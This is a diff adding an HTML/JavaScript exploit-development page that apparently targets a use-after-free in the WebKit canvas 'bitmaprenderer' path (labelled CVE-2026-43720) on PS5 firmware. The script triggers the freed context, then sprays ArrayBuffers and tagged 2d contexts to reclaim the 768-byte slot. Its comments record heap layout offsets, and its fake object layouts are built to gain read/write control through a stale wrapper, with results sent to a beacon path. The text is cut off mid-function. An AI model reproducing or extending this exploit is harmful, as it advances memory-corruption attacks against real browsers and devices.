@@ -1,0 +1,997 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V592 control</title></head>
+<body><pre id="out">V592 — post-trigger control / reclaim probe</pre>
+<script>
+/* V592-ctl: same CVE-2026-43720 trigger as v592.html, then ONE controlled
+ * action so we can tell WHY the post-trigger read dies on 14.20.
+ *
+ *   op=none            do nothing after the trigger (pure liveness control)
+ *   op=ping            beacon immediately after the trigger (stage-1 equivalent)
+ *   op=canvas          savedCtx.canvas.width   (is the wrapper object alive?)
+ *   op=lw              savedCtx.lineWidth      (crash baseline)
+ *   op=reclaimctx&n=N  allocate N fresh 2d contexts (unique state), then read
+ *                      the stale lineWidth: 4.5678 => same-type reclaim worked
+ *   op=sprayobj&len=N  spray N*8+8-byte JS double arrays at the freed CONTEXT
+ *                      OBJECT slot; a hit makes lineWidth read 1.2345
+ *   op=reclaim&len=N   spray JSArray butterflies of ~N*8+8 bytes into the
+ *                      freed state-stack size class, THEN read lineWidth
+ *
+ * A pre-scheduled LATE timer is armed BEFORE the trigger, so "renderer still
+ * alive" is reported without needing any allocation right after the trigger.
+ *
+ * All links should use once=1: after a renderer crash + auto-reload the guard
+ * stops a second run, so you never get a crash/OOM loop.
+ */
+var PARAM = {};
+try {
+  var qs = location.search.replace(/^\?/, '');
+  var parts = qs.split('&');
+  for (var qi = 0; qi < parts.length; qi++) {
+    if (!parts[qi]) continue;
+    var kv = parts[qi].split('=');
+    PARAM[kv[0]] = decodeURIComponent(kv[1] || '');
+  }
+} catch (e) {}
+
+var OP = PARAM.op || 'none';
+var LEN = parseInt(PARAM.len || '1849', 10);
+var SPRAY_N = parseInt(PARAM.spray || '64', 10);
+var ONCE = PARAM.once === '1';
+var NORETRY = PARAM.noretry === '1';
+/* fill=marker : every 8-byte slot = 9999.99 (0x40c3877c...) -> invalid pointer,
+ *                so a hit faults and a read cannot tell hit from miss.
+ * fill=zero   : leave the fresh ArrayBuffer zeroed (new ArrayBuffer is already
+ *                zero-initialised) -> a hit reads lineWidth=0 safely, so the
+ *                sweep never crashes and the TRY/STEP markers always land. */
+var ABFILL = (PARAM.fill === 'zero') ? 'zero' : 'marker';
+var O = document.getElementById('out');
+
+function storage() {
+  try { return window.sessionStorage; } catch (e) {}
+  try { return window.localStorage; } catch (e) {}
+  return null;
+}
+
+/* Guard helpers. The old code only touched whichever storage storage()
+ * returned, so a RESET in one tab could not clear a guard another tab had
+ * written to the other storage. Both storages are handled now. */
+function eachStorage(fn) {
+  try { if (window.sessionStorage) fn(window.sessionStorage); } catch (e) {}
+  try { if (window.localStorage) fn(window.localStorage); } catch (e) {}
+}
+function guardRead(k) {
+  var v = null;
+  eachStorage(function (s) { try { if (v === null) v = s.getItem(k); } catch (e) {} });
+  return v;
+}
+function guardWrite(k) {
+  eachStorage(function (s) { try { s.setItem(k, '1'); } catch (e) {} });
+}
+function guardClear(k) {
+  eachStorage(function (s) { try { s.removeItem(k); } catch (e) {} });
+}
+function guardClearAll() {
+  var cleared = 0;
+  var prefixes = ['v592c_', 'v592r_', 'v592w_', 'v592s_'];
+  eachStorage(function (s) {
+    try {
+      var keys = [];
+      for (var i = 0; i < s.length; i++) keys.push(s.key(i));
+      for (var j = 0; j < keys.length; j++) {
+        var k = keys[j];
+        if (!k) continue;
+        for (var p = 0; p < prefixes.length; p++) {
+          if (k.indexOf(prefixes[p]) === 0) { s.removeItem(k); cleared++; break; }
+        }
+      }
+    } catch (e) {}
+  });
+  return cleared;
+}
+
+var guardSuffix = '0';
+if (OP === 'reclaim' || OP === 'sprayobj' || OP === 'probe') guardSuffix = String(LEN);
+else if (OP === 'reclaimctx' || OP === 'reclaimread' || OP === 'tagctx') guardSuffix = String(PARAM.n || '32');
+else if (OP === 'abalias' || OP === 'abdirect' || OP === 'abfake' || OP === 'direct') guardSuffix = String(PARAM.ablen || '768') + '_' + ABFILL + '_' + (OP === 'direct' ? 'direct' : (PARAM.lw ? String(PARAM.lw).replace(/\./g,'') : '0') + '_' + (PARAM.nowrite || '0'));
+else if (OP === 'absweep') guardSuffix = (PARAM.lens ? String(PARAM.lens).replace(/,/g, '-') : 'def') + '_' + ABFILL;
+var guardKey = 'v592c_' + OP + '_' + guardSuffix;
+var GUARD_OFF = PARAM.guard === '0';
+var BLOCKED = false;
+var st = storage();
+if (PARAM.reset === '1') guardClear(guardKey);
+if (!GUARD_OFF && ONCE && OP !== 'abwalk' && OP !== 'abfakescan') {
+  if (guardRead(guardKey) === '1') BLOCKED = true;
+  else guardWrite(guardKey);
+}
+
+function say(s) { O.textContent += '\n' + s; }
+
+function bk(tag, body) {
+  var u = '/beacon/V592C-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 800)) + '&t=' + Date.now();
+  try { new Image().src = u; } catch (e) {}
+  if (!NORETRY) {
+    setTimeout(function () { try { new Image().src = u + '&r=2'; } catch (e) {} }, 4000);
+    setTimeout(function () { try { new Image().src = u + '&r=3'; } catch (e) {} }, 8000);
+  }
+}
+
+/* Synchronous beacon: guarantees the log entry exists before the next line
+ * runs, so a crash can never swallow the TRY marker of the size under test. */
+function bks(tag, body) {
+  var u = '/beacon/V592C-' + tag + '?d=' + encodeURIComponent(String(body).slice(0, 300)) + '&t=' + Date.now() + '&s=1';
+  try {
+    var x = new XMLHttpRequest();
+    x.open('GET', u, false);
+    x.send(null);
+  } catch (e) {}
+}
+
+/* Pre-allocated readers (must exist before the trigger). */
+var f64 = new Float64Array(1);
+var u32 = new Uint32Array(f64.buffer);
+function d2hex(d) {
+  if (typeof d !== 'number') return String(d);
+  f64[0] = d;
+  var hi = u32[1], lo = u32[0];
+  return '0x' + ('00000000' + hi.toString(16)).slice(-8) + ('00000000' + lo.toString(16)).slice(-8);
+}
+
+var SAVES = 32;
+var SAVE_N = (PARAM.saves === undefined) ? SAVES : parseInt(PARAM.saves, 10);
+
+if (OP === 'resetall') {
+  var cleared = guardClearAll();
+  bk('RESET', 'cleared=' + cleared);
+  say('Cleared ' + cleared + ' once-guard flags (both storages). Every probe link will run again.');
+} else if (BLOCKED) {
+  bk('BLOCKED', 'op=' + OP + ',len=' + LEN + ',once-guard');
+  say('Blocked by once=1. Tap the RESET link in the index, or add reset=1.');
+} else {
+  /* Arm liveness timer BEFORE the trigger: no allocation is needed after it. */
+  var lateFired = false;
+  setTimeout(function () {
+    lateFired = true;
+    bk('LATE', 'op=' + OP + ',len=' + LEN + ',alive=1');
+    say('LATE: renderer alive 1200ms after trigger');
+  }, 1200);
+
+  bk('BOOT', 'v592-ctl-op=' + OP + '-len=' + LEN);
+  bk('CONFIG', 'op=' + OP + ',len=' + LEN + ',n=' + (PARAM.n || '32') + ',spray=' + SPRAY_N + ',saves=' + SAVE_N + ',ablen=' + (PARAM.ablen || '-') + ',fill=' + ABFILL);
+  say('V592 ctl: op=' + OP + ' len=' + LEN + ' spray=' + SPRAY_N);
+
+  var savedCtx = null;
+  var canvas = document.createElement('canvas');
+  canvas.width = 1;
+  canvas.height = 1;
+  document.body.appendChild(canvas);
+
+  var dict = {};
+  Object.defineProperty(dict, 'alpha', {
+    get: function () {
+      var ctx = canvas.getContext('2d');
+      if (!ctx) return true;
+      savedCtx = ctx;
+      ctx.lineWidth = 3.14159;
+      ctx.miterLimit = 7.77;
+      ctx.globalAlpha = 0.42;
+      ctx.lineDashOffset = 2.222;
+      ctx.shadowBlur = 5.55;
+      for (var i = 0; i < SAVE_N; i++) ctx.save();
+      ctx.lineWidth = 1.0;
+      return true;
+    }
+  });
+
+  var bmpCtx = null;
+  try { bmpCtx = canvas.getContext('bitmaprenderer', dict); }
+  catch (e) { bk('ERR', 'bmr:' + e.name); }
+
+  if (!savedCtx || !bmpCtx) {
+    bk('ERR', 'no-ctx:inner=' + !!savedCtx + ',bmr=' + !!bmpCtx);
+    say('ABORT: trigger failed');
+  } else {
+    /* ---- exactly one action, no allocations before a state read ---- */
+    if (OP === 'none') {
+      /* deliberately nothing here */
+    } else if (OP === 'canvas') {
+      var w = -1, ce = null;
+      try { w = savedCtx.canvas.width; } catch (e) { ce = e.name; }
+      bk('CREAD', 'canvas.width=' + w + (ce ? ',ERR=' + ce : ''));
+    } else if (OP === 'lw') {
+      var lw, le = null;
+      try { lw = savedCtx.lineWidth; } catch (e) { le = e.name; }
+      bk('RREAD', 'lw=' + d2hex(lw) + (le ? ',ERR=' + le : ''));
+    } else if (OP === 'ping') {
+      /* stage-1 equivalent on this page: prove the trigger returned and that
+       * an allocation right after it is survivable. */
+      bk('PING', 'trigger-returned');
+
+    } else if (OP === 'direct') {
+      /* Direct spray + read. Trigger already fired, savedCtx is alive (lw=3.14159).
+       * Spray N ArrayBuffers of size ABLEN, then read lw through the stale wrapper.
+       *   lw=9999.99 -> AB took the 768B slot
+       *   lw=7777.77 or other -> AB missed, context still alive
+       *   death/crash -> AB took slot but read faulted
+       */
+      var DN = parseInt(PARAM.n || '400', 10);
+      var DBL = parseInt(PARAM.ablen || '768', 10);
+      var dkeep = [];
+      for (var di = 0; di < DN; di++) {
+        var dab = new ArrayBuffer(DBL);
+        if ((DBL & 7) === 0 && ABFILL === 'marker') {
+          var dfv = new Float64Array(dab);
+          for (var dk = 0; dk < (DBL >> 3); dk++) dfv[dk] = 9999.99;
+        }
+        dkeep[di] = dab;
+      }
+      canvas._direct = dkeep;
+      bks('ABSPRAY', 'n=' + DN + ',len=' + DBL + ',direct=true');
+
+      var drv = -1, dre = null;
+      try { drv = savedCtx.lineWidth; } catch (e) { dre = e.name; }
+      if (dre) {
+        bk('RREAD', 'direct len=' + DBL + ',n=' + DN + ',ERR=' + dre);
+      } else {
+        bk('RREAD', 'direct len=' + DBL + ',n=' + DN + ',lw=' + drv + ',hex=' + d2hex(drv));
+        var dwv = -1;
+        try { savedCtx.lineWidth = 1234.5; dwv = savedCtx.lineWidth; } catch(e){}
+        bks('ABWRITE', 'back=' + dwv + ',ok=' + (dwv === 1234.5 ? 1 : 0));
+      }
+
+    } else if (OP === 'reclaimctx') {
+      /* Allocate N fresh 2d contexts (same type as the freed object) with a
+       * unique state, then read the stale savedCtx.lineWidth. If we get
+       * 4.5678 back, a new context landed in the freed slot and the stale
+       * wrapper is usable again. If it crashes, the slot is not reclaimable
+       * this way. */
+      var N = parseInt(PARAM.n || '32', 10);
+      var keep = new Array(N);
+      var made = 0;
+      for (var k = 0; k < N; k++) {
+        var c2 = document.createElement('canvas');
+        c2.width = 1; c2.height = 1;
+        var cx = null;
+        try { cx = c2.getContext('2d'); } catch (e) {}
+        if (cx) {
+          try {
+            cx.lineWidth = 4.5678;
+            cx.miterLimit = 8.88;
+            cx.globalAlpha = 0.33;
+            cx.lineDashOffset = 6.66;
+            cx.shadowBlur = 9.99;
+          } catch (e) {}
+          keep[made++] = c2;
+        }
+      }
+      var q = 0, qe = null;
+      try { q = savedCtx.lineWidth; } catch (e) { qe = e.name; }
+      canvas._keep = keep;
+      bk('RREAD', 'ctxreclaim n=' + N + ',made=' + made + ',lw=' + d2hex(q) + (qe ? ',ERR=' + qe : ''));
+
+    } else if (OP === 'reclaimread') {
+      /* Read-only diagnostic: same-type reclaim (N fresh 2d contexts, each
+       * tagged with a unique state), then read ALL five state fields through
+       * the stale wrapper. This tells us whether the alias is complete
+       * (every field matches the tagged value) or whether lineWidth just
+       * happens to look right. No writes, no forging. */
+      var RN = parseInt(PARAM.n || '32', 10);
+      var rkeep = new Array(RN);
+      var rmade = 0;
+      for (var rk = 0; rk < RN; rk++) {
+        var rc = document.createElement('canvas');
+        rc.width = 1; rc.height = 1;
+        var rcx = null;
+        try { rcx = rc.getContext('2d'); } catch (e) {}
+        if (rcx) {
+          try {
+            rcx.lineWidth = 4.5678;
+            rcx.miterLimit = 8.88;
+            rcx.globalAlpha = 0.33;
+            rcx.lineDashOffset = 6.66;
+            rcx.shadowBlur = 9.99;
+          } catch (e) {}
+          rkeep[rmade++] = rc;
+        }
+      }
+      var rvals = [];
+      var rerrs = [];
+      var rnames = ['lw', 'ml', 'ga', 'ldo', 'sb'];
+      try { rvals.push(d2hex(savedCtx.lineWidth)); rerrs.push(''); } catch (e) { rvals.push('ERR'); rerrs.push(e.name); }
+      try { rvals.push(d2hex(savedCtx.miterLimit)); rerrs.push(''); } catch (e) { rvals.push('ERR'); rerrs.push(e.name); }
+      try { rvals.push(d2hex(savedCtx.globalAlpha)); rerrs.push(''); } catch (e) { rvals.push('ERR'); rerrs.push(e.name); }
+      try { rvals.push(d2hex(savedCtx.lineDashOffset)); rerrs.push(''); } catch (e) { rvals.push('ERR'); rerrs.push(e.name); }
+      try { rvals.push(d2hex(savedCtx.shadowBlur)); rerrs.push(''); } catch (e) { rvals.push('ERR'); rerrs.push(e.name); }
+      canvas._keep = rkeep;
+      var rline = 'reclaimread n=' + RN + ',made=' + rmade;
+      for (var rq = 0; rq < rnames.length; rq++) {
+        rline += ',' + rnames[rq] + '=' + rvals[rq] + (rerrs[rq] ? '!' + rerrs[rq] : '');
+      }
+      bk('RREAD', rline);
+
+    } else if (OP === 'sweep') {
+      /* One-tap size sweep. Each iteration gets a FRESH trigger, so a miss
+       * does not poison the next test. A TRY beacon is sent before every
+       * size, so if the renderer dies the last TRY in the log is the size
+       * class that actually hit the freed object slot. */
+      var list = String(PARAM.lens || '256,288,320,360,400,448,512,576,640,720,800,896,1024,1152,1280,1440,1600,1792,2000').split(',');
+      var SM = parseInt(PARAM.spray || '24', 10);
+      var SC = parseInt(PARAM.ctx || '24', 10);
+      var allKeep = [];
+      for (var li2 = 0; li2 < list.length; li2++) {
+        var SL = parseInt(list[li2], 10);
+        if (!SL) continue;
+        bk('TRY', 'len=' + SL);
+
+        var scv = document.createElement('canvas');
+        scv.width = 1; scv.height = 1;
+        document.body.appendChild(scv);
+        var sinner = null;
+        var sdict = {};
+        Object.defineProperty(sdict, 'alpha', {
+          get: function () {
+            var c2 = scv.getContext('2d');
+            if (!c2) return true;
+            sinner = c2;
+            c2.lineWidth = 3.14159;
+            c2.miterLimit = 7.77;
+            for (var s3 = 0; s3 < SAVES; s3++) c2.save();
+            c2.lineWidth = 1.0;
+            return true;
+          }
+        });
+        var sbc = null;
+        try { sbc = scv.getContext('bitmaprenderer', sdict); } catch (e) {}
+        if (!sinner || !sbc) { bk('STEP', 'len=' + SL + ',notrigger'); continue; }
+
+        /* 1. butterflies of this size class */
+        var hh = new Array(SM);
+        for (var mi = 0; mi < SM; mi++) {
+          var bb = new Array(SL);
+          for (var mj = 0; mj < SL; mj++) bb[mj] = 1.2345;
+          hh[mi] = bb;
+        }
+        allKeep.push(hh);
+
+        /* 2. real contexts, tagged, to take the slot if the spray missed */
+        var kk = new Array(SC);
+        for (var ci = 0; ci < SC; ci++) {
+          var ccv = document.createElement('canvas');
+          ccv.width = 1; ccv.height = 1;
+          var ccx = null;
+          try { ccx = ccv.getContext('2d'); } catch (e) {}
+          if (ccx) { try { ccx.lineWidth = 200 + ci; } catch (e) {} }
+          kk[ci] = ccv;
+        }
+        allKeep.push(kk);
+
+        /* 3. one read */
+        var srv = -1, sre = null;
+        try { srv = sinner.lineWidth; } catch (e) { sre = e.name; }
+        if (sre) bk('STEP', 'len=' + SL + ',ERR=' + sre);
+        else if (srv === 1.2345) bk('STEP', 'len=' + SL + ',HIT=butterfly,lw=' + srv);
+        else bk('STEP', 'len=' + SL + ',miss,lw=' + srv);
+      }
+      canvas._keep = allKeep;
+      bk('SWEEPDONE', 'n=' + list.length);
+
+    } else if (OP === 'abalias' || OP === 'abdirect') {
+      /* Port of the documented 14.10 AB-reclaim recipe (V527 / V527b).
+       *
+       *   abdirect : trigger -> 400x ArrayBuffer(768) marker spray -> read lw
+       *   abalias  : trigger -> same-type alias -> free the alias owner with a
+       *              bitmaprenderer lever -> 400x ArrayBuffer(768) -> read lw
+       *
+       * CanvasRenderingContext2D is a 768-byte FastMalloc allocation. JSArray
+       * butterflies live in JSC heaps (and are pinned by conservative GC), so
+       * they can never land there -- that is why every butterfly/string spray
+       * missed. ArrayBuffer backing stores share the FastMalloc heap on PS5
+       * (gigacage disabled), so an ArrayBuffer(768) CAN take the slot.
+       *
+       *   9999.99 -> AB reclaimed the slot: byte control over the object
+       *   7777.77 -> lever failed, stale wrapper still aliases a live context
+       *   death   -> no reclaim (slot still free) or AB landed with a layout
+       *              that faults on the first deref
+       */
+      var ABLEN = parseInt(PARAM.ablen || '768', 10);
+      var ABN = parseInt(PARAM.abn || '400', 10);
+      var absKeep = new Array(ABN);
+      var aliasIdx = -1;
+
+      if (OP === 'abalias') {
+        var K = parseInt(PARAM.n || '64', 10);
+        var sprayC = new Array(K);
+        var sprayX = new Array(K);
+        for (var ai = 0; ai < K; ai++) {
+          var ac = document.createElement('canvas');
+          ac.width = 8; ac.height = 8; ac.id = 'k' + ai;
+          var ax = null;
+          try { ax = ac.getContext('2d'); } catch (e) {}
+          if (ax) { try { ax.lineWidth = 7777.77; } catch (e) {} }
+          sprayC[ai] = ac; sprayX[ai] = ax;
+        }
+        canvas._alias = sprayC;
+        canvas._aliasX = sprayX;
+
+        var aid = '?';
+        try { aid = savedCtx.canvas.id; } catch (e) { aid = 'ERR:' + e.name; }
+        bk('ALIAS', 'id=' + aid);
+        if (aid && aid.charAt(0) === 'k') aliasIdx = parseInt(aid.slice(1), 10);
+
+        if (aliasIdx >= 0) {
+          var LV = PARAM.lever || 'reentrant';
+          var el = sprayC[aliasIdx];
+          var via = 'none';
+          try {
+            if (LV === 'reentrant') {
+              /* Re-run the SAME bug on the aliased canvas: the getter re-enters
+               * getContext('2d') (returns the existing, aliased context), then
+               * the outer bitmaprenderer call replaces m_context and frees it. */
+              var dd = {};
+              Object.defineProperty(dd, 'alpha', {
+                get: function () {
+                  try { el.getContext('2d'); } catch (e) {}
+                  return true;
+                }
+              });
+              el.getContext('bitmaprenderer', dd);
+              via = 'reentrant';
+            } else if (LV === 'width') {
+              el.width = 16;
+              via = 'width';
+            } else {
+              el.getContext('bitmaprenderer');
+              via = 'bmr';
+            }
+            bk('LEVER', 'idx=' + aliasIdx + ',via=' + via);
+          } catch (e) { bk('LEVER', 'ERR=' + e.name + ',idx=' + aliasIdx + ',via=' + LV); }
+        } else {
+          bk('LEVER', 'no-alias');
+        }
+      }
+
+      for (var abi = 0; abi < ABN; abi++) {
+        var ab = new ArrayBuffer(ABLEN);
+        if (ABFILL === 'marker' && (ABLEN & 7) === 0) {
+          var dv = new Float64Array(ab);
+          var nslots = ABLEN >> 3;
+          for (var sj2 = 0; sj2 < nslots; sj2++) dv[sj2] = 9999.99;
+        }
+        absKeep[abi] = ab;
+      }
+      canvas._abs = absKeep;
+      bks('ABSPRAY', 'n=' + ABN + ',len=' + ABLEN + ',fill=' + ABFILL + ',alias=' + aliasIdx);
+
+      var abr = -1, aber = null;
+      try { abr = savedCtx.lineWidth; } catch (e) { aber = e.name; }
+      if (aber) {
+        bk('RREAD', 'ab ' + OP + ' len=' + ABLEN + ',fill=' + ABFILL + ',ERR=' + aber + ',alias=' + aliasIdx);
+      } else {
+        bk('RREAD', 'ab ' + OP + ' len=' + ABLEN + ',fill=' + ABFILL + ',lw=' + abr + ',hex=' + d2hex(abr) + ',alias=' + aliasIdx);
+        if (ABFILL === 'marker' && abr === 9999.99) {
+          var wrOk = 0;
+          try { savedCtx.lineWidth = 1234.5; wrOk = (savedCtx.lineWidth === 1234.5) ? 1 : 0; } catch (e) {}
+          bks('ABWRITE', 'ok=' + wrOk);
+        }
+      }
+
+    } else if (OP === 'absweep') {
+      /* AB size-class oracle. ArrayBuffer backing stores share the FastMalloc
+       * heap on PS5 (gigacage disabled), so an AB can land in the freed 768B
+       * CanvasRenderingContext2D slot. Same oracle as the butterfly sweeps:
+       * spray ABs of this size, then 24 tagged real contexts, then one read.
+       *   miss,ctx=200+i -> a real context won, AB size did not match
+       *   HIT / death    -> the AB took the slot; last TRY gives the size
+       */
+      var alist = String(PARAM.lens || '96,128,160,192,224,256,288,320,352,384,416,448,480,512,576,640,704,768,832,896,960,1024,1152,1280,1536').split(',');
+      var AM = parseInt(PARAM.spray || '32', 10);
+      var AC = parseInt(PARAM.ctx || '24', 10);
+      var ASTART = parseInt(PARAM.start || '0', 10);
+      var akeep = [];
+      for (var ali = 0; ali < alist.length; ali++) {
+        var AL = parseInt(alist[ali], 10);
+        if (!AL || AL < ASTART) continue;
+        bks('TRY', 'ablen=' + AL + ',fill=' + ABFILL);
+
+        var acv = document.createElement('canvas');
+        acv.width = 1; acv.height = 1;
+        document.body.appendChild(acv);
+        var ainner = null;
+        var adict = {};
+        Object.defineProperty(adict, 'alpha', {
+          get: function () {
+            var c2 = acv.getContext('2d');
+            if (!c2) return true;
+            ainner = c2;
+            c2.lineWidth = 3.14159;
+            c2.miterLimit = 7.77;
+            for (var s3 = 0; s3 < SAVE_N; s3++) c2.save();
+            c2.lineWidth = 1.0;
+            return true;
+          }
+        });
+        var abc = null;
+        try { abc = acv.getContext('bitmaprenderer', adict); } catch (e) {}
+        if (!ainner || !abc) { bks('STEP', 'ablen=' + AL + ',notrigger'); continue; }
+
+        /* 1. ArrayBuffer spray of exactly this size class */
+        var aarr = new Array(AM);
+        for (var aj = 0; aj < AM; aj++) {
+          var abx = new ArrayBuffer(AL);
+          if (ABFILL === 'marker' && (AL & 7) === 0) {
+            var fv = new Float64Array(abx);
+            for (var ak = 0; ak < (AL >> 3); ak++) fv[ak] = 9999.99;
+          }
+          aarr[aj] = abx;
+        }
+        akeep.push(aarr);
+
+        /* 2. tagged real contexts */
+        var akk = new Array(AC);
+        for (var aci = 0; aci < AC; aci++) {
+          var accv = document.createElement('canvas');
+          accv.width = 1; accv.height = 1;
+          var accx = null;
+          try { accx = accv.getContext('2d'); } catch (e) {}
+          if (accx) { try { accx.lineWidth = 200 + aci; } catch (e) {} }
+          akk[aci] = accv;
+        }
+        akeep.push(akk);
+
+        /* 3. read */
+        var arv = -1, are = null;
+        try { arv = ainner.lineWidth; } catch (e) { are = e.name; }
+        if (are) bks('STEP', 'ablen=' + AL + ',ERR=' + are + ',fill=' + ABFILL);
+        else if (arv >= 200 && arv < 200 + AC) bks('STEP', 'ablen=' + AL + ',miss,ctx=' + arv);
+        else bks('STEP', 'ablen=' + AL + ',HIT=lw' + arv + ',hex=' + d2hex(arv) + ',fill=' + ABFILL);
+      }
+      canvas._keep = akeep;
+      bk('ABSWEEPDONE', 'n=' + alist.length);
+
+    } else if (OP === 'abwalk') {
+      /* One size class per page load, chained by navigation.
+       *
+       * absweep runs all sizes in one renderer, so a crash can come from
+       * accumulated churn (the trigger allocates a lot per iteration) instead
+       * of from the ArrayBuffer actually taking the slot. Here each size gets
+       * a fresh renderer: trigger once, spray ABs of one size, allocate tagged
+       * contexts, read, then navigate to the next size.
+       *
+       * Progress lives in the URL (i=N) and in sessionStorage, and is advanced
+       * BEFORE the risky part, so:
+       *   - a renderer crash can never re-run the same size (no reload loop),
+       *   - the auto-reload continues with i+1 automatically.
+       * The crashing size is therefore exactly the last WTRY without a WSTEP.
+       *
+       * Control run: the same walk with spray=0. A size that dies with
+       * spray=32 but gives miss,ctx=2xx with spray=0 is a real AB hit.
+       */
+      var wlens = String(PARAM.lens || '96,128,160,192,224,256,288,320,352,384,416,448,480,512,576,640,704,768,832,896,960,1024,1152,1280,1536').split(',');
+      var WAM = parseInt(PARAM.spray || '32', 10);
+      var WAC = parseInt(PARAM.ctx || '24', 10);
+      var wstored = 0;
+      try { wstored = parseInt(st.getItem('v592w_i') || '0', 10) || 0; } catch (e) {}
+      var wparam = parseInt(PARAM.i || '0', 10) || 0;
+      if (wparam > wstored) wstored = wparam;
+      var wi = wstored;
+
+      if (wi >= wlens.length) {
+        bks('ABWALKDONE', 'n=' + wlens.length + ',fill=' + ABFILL + ',spray=' + WAM);
+        say('walk complete: all ' + wlens.length + ' size classes attempted');
+      } else {
+        var WAL = parseInt(wlens[wi], 10);
+        try { st.setItem('v592w_i', String(wi + 1)); } catch (e) {}
+        bks('WTRY', 'i=' + wi + ',ablen=' + WAL + ',fill=' + ABFILL + ',spray=' + WAM);
+
+        /* 1. ArrayBuffer spray of exactly this size class */
+        var wkeep = new Array(WAM);
+        for (var wj = 0; wj < WAM; wj++) {
+          var wab = new ArrayBuffer(WAL);
+          if (ABFILL === 'marker' && (WAL & 7) === 0) {
+            var wfv = new Float64Array(wab);
+            for (var wk = 0; wk < (WAL >> 3); wk++) wfv[wk] = 9999.99;
+          }
+          wkeep[wj] = wab;
+        }
+        canvas._walkAB = wkeep;
+
+        /* 2. tagged real contexts: lw = 200+i identifies which one won */
+        var wctx = new Array(WAC);
+        for (var wci = 0; wci < WAC; wci++) {
+          var wcv = document.createElement('canvas');
+          wcv.width = 1; wcv.height = 1;
+          var wcx = null;
+          try { wcx = wcv.getContext('2d'); } catch (e) {}
+          if (wcx) { try { wcx.lineWidth = 200 + wci; } catch (e) {} }
+          wctx[wci] = wcv;
+        }
+        canvas._walkCtx = wctx;
+
+        /* 3. read through the stale wrapper */
+        var wrv = -1, wre = null;
+        try { wrv = savedCtx.lineWidth; } catch (e) { wre = e.name; }
+        if (wre) bks('WSTEP', 'i=' + wi + ',ablen=' + WAL + ',ERR=' + wre);
+        else if (wrv >= 200 && wrv < 200 + WAC) bks('WSTEP', 'i=' + wi + ',ablen=' + WAL + ',miss,ctx=' + wrv);
+        else bks('WSTEP', 'i=' + wi + ',ablen=' + WAL + ',HIT=lw=' + wrv + ',hex=' + d2hex(wrv));
+
+        /* 4. next size on the same URL (built from the current params) */
+        var wq = [];
+        for (var wp in PARAM) {
+          if (wp === 'i' || wp === 'cb') continue;
+          wq.push(wp + '=' + encodeURIComponent(PARAM[wp]));
+        }
+        wq.push('i=' + (wi + 1));
+        var wnext = location.pathname + '?' + wq.join('&');
+        say('next: i=' + (wi + 1) + ' / ' + wlens.length);
+        setTimeout(function () { try { location.replace(wnext); } catch (e) {} }, 700);
+      }
+
+    } else if (OP === 'abfake') {
+      /* The walk proved the reclaim: ablen=768 dies only with the ArrayBuffer
+       * spray and misses with spray=0. It dies at the *read*, because a
+       * marker-filled AB makes m_stateStack.m_buffer (+112) a bogus pointer
+       * and the getter dereferences it.
+       *
+       * Fix: keep the AB zeroed and make the state vector look "inline":
+       *   +112  m_buffer   = 0  -> data() falls back to the inline buffer
+       *   +120  m_size     = 1  -> last() = element 0
+       *   +124  m_capacity = 1
+       *   +128  inline State
+       *   +176  lineWidth  (State + 48) = payload
+       * Reading the payload back means we control the object's memory without
+       * ever dereferencing an unknown pointer. Then a write test proves the
+       * stale wrapper is a real read/write window into our own ArrayBuffer.
+       *
+       *   lw=<payload>  -> hit + byte control
+       *   crash         -> the state buffer is dereferenced unconditionally
+       *                    (then try varying mbo= to place the buffer pointer)
+       */
+      var FL = parseInt(PARAM.ablen || '768', 10);
+      var FN = parseInt(PARAM.abn || '400', 10);
+      var FLW = parseFloat(PARAM.lw || '4242.4242');
+      var FMB = parseInt(PARAM.mbo || '0', 10);   /* patch offset for m_buffer */
+      var FSZ = parseInt(PARAM.szo || '120', 10); /* patch offset for m_size    */
+      var FST = parseInt(PARAM.sto || '128', 10); /* patch offset for inline State */
+      var FLO = parseInt(PARAM.lwo || String(FST + 48), 10);
+
+      var fkeep = new Array(FN);
+      for (var fi = 0; fi < FN; fi++) {
+        var fab = new ArrayBuffer(FL);
+        if ((FL & 7) === 0) {
+          /* m_buffer at FMB stays zero (new ArrayBuffer is zero-initialised) */
+          var fszv = new Uint32Array(fab, FSZ, 2);
+          fszv[0] = 1;  /* m_size     */
+          fszv[1] = 1;  /* m_capacity */
+          var fdv = new Float64Array(fab, FLO, 1);
+          fdv[0] = FLW;
+          if (FMB) new Uint32Array(fab, FMB, 2)[0] = 0;
+        }
+        fkeep[fi] = fab;
+      }
+      canvas._fake = fkeep;
+      bks('FAKE', 'len=' + FL + ',n=' + FN + ',payload=' + FLW + ',size@' + FSZ + ',lw@' + FLO + ',mb@' + FMB);
+
+      var frv = -1, fre = null;
+      try { frv = savedCtx.lineWidth; } catch (e) { fre = e.name; }
+      if (fre) {
+        bks('READ', 'fake ERR=' + fre + ',len=' + FL);
+      } else {
+        /* synchronous: a crash in the setter below must not swallow this */
+        bks('READ', 'fake lw=' + frv + ',hex=' + d2hex(frv) + ',len=' + FL + ',lw@' + FLO);
+        if (PARAM.nowrite !== '1') {
+          var fback = -1, fraw = -1;
+          try { savedCtx.lineWidth = 1234.5; fback = savedCtx.lineWidth; } catch (e) {}
+          try { fraw = new Float64Array(fkeep[0], FLO, 1)[0]; } catch (e) {}
+          bks('FAKEWRITE', 'back=' + fback + ',ab=' + fraw + ',ok=' + ((fback === 1234.5 && fraw === 1234.5) ? 1 : 0) + ',len=' + FL);
+        }
+      }
+
+    } else if (OP === 'abfakescan') {
+      /* Scan the state-vector layout with fresh renderers.
+       *
+       * For each candidate m_buffer offset MB the vector is assumed to be the
+       * classic WTF layout:
+       *   MB+0  m_buffer   = 0   (zero from new ArrayBuffer)
+       *   MB+8  m_size     = 1
+       *   MB+12 m_capacity = 1
+       *   MB+16 inline State[0]  -> lineWidth at MB+16+48 = MB+64
+       * Zero m_buffer means data() falls back to the inline buffer, so nothing
+       * unknown is dereferenced. Each page tests one MB; a crash just advances
+       * the walk. A surviving read tells us the payload offset was right.
+       */
+      var soffs = String(PARAM.offs || '96,104,112,120,128,136,144,152,160').split(',');
+      var sstored = 0;
+      try { sstored = parseInt(st.getItem('v592s_i') || '0', 10) || 0; } catch (e) {}
+      var sparam = parseInt(PARAM.i || '0', 10) || 0;
+      if (sparam > sstored) sstored = sparam;
+      var si2 = sstored;
+
+      if (si2 >= soffs.length) {
+        bks('SCANDONE', 'n=' + soffs.length);
